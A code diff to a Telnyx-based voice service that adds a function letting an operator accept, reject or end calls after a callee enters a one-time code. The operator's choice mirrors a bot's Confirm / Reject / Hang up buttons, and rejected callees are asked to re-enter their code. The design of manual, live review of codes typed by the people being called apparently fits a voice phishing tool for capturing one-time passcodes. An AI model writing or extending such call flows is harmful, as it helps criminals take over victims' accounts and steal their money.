@@ -5884,7 +5884,52 @@ async function dialBridgeLeg(callControlId, forwardTo, fromNumber) {
   return true
 }
 
+// Web accounts answer the "code collected" prompt in the app — same steps as the bot's Confirm / Reject / Hang up buttons.
+// accept → confirm message, then transfer (or hang up when there is no transfer number); decline → ask again until the
+// attempts run out; hangup → goodbye.
+async function resolveOtp(callControlId, action) {
+  const session = outboundIvrCalls[callControlId]
+  if (!session) return { error: 'ended' }
+  if (session.phase !== 'otp_hold') return { error: 'not_waiting', phase: session.phase }
+  const voice = getTelnyxVoice(session.voiceName)
+  if (action === 'accept') {
+    session.phase = 'otp_confirmed'
+    session.otpStatus = 'confirmed'
+    await _telnyxApi.speakOnCall(callControlId, session.otpConfirmMsg || (session.ivrNumber ? 'Your code has been verified. Connecting you now.' : 'Your code has been verified. Thank you, goodbye.'), voice).catch(() => {})
+    setTimeout(() => {
+      const next = session.ivrNumber ? _telnyxApi.transferCall(callControlId, session.ivrNumber, session.callerId) : _telnyxApi.hangupCall(callControlId)
+      Promise.resolve(next).catch(e => log(`[OTP-Web] after accept: ${e.message}`))
+    }, session.ivrNumber ? 3000 : 5000)
+    return { phase: session.phase }
+  }
+  if (action === 'decline') {
+    const max = session.otpMaxAttempts || 3
+    const attempt = session.otpAttempt || 1
+    if (attempt < max) {
+      session.phase = 'otp_gathering'
+      session.otpStatus = 'retry'
+      session.otpDigits = null
+      session.otpAttempt = attempt + 1
+      await _telnyxApi.gatherDTMFWithSpeak(callControlId, session.otpRejectMsg || `That code was not accepted. Please enter your ${session.otpLength || 6}-digit code again.`, voice, {
+        minDigits: session.otpLength || 4, maxDigits: session.otpLength || 6, timeout: 30000, interDigitTimeout: 5000, validDigits: '0123456789',
+      }).catch(() => {})
+      return { phase: session.phase, remaining: max - attempt }
+    }
+    session.phase = 'otp_failed'
+    session.otpStatus = 'rejected_final'
+    await _telnyxApi.speakOnCall(callControlId, 'Your code could not be verified. Goodbye.', voice).catch(() => {})
+    setTimeout(() => _telnyxApi.hangupCall(callControlId).catch(() => {}), 3000)
+    return { phase: session.phase, remaining: 0 }
+  }
+  session.phase = 'otp_hungup'
+  session.otpStatus = 'manual_hangup'
+  await _telnyxApi.speakOnCall(callControlId, 'Goodbye.', voice).catch(() => {})
+  setTimeout(() => _telnyxApi.hangupCall(callControlId).catch(() => {}), 1500)
+  return { phase: session.phase }
+}
+
 module.exports = {
+  resolveOtp,
   handleVoiceWebhook,
   initVoiceService,
   getLiveCallCounts,
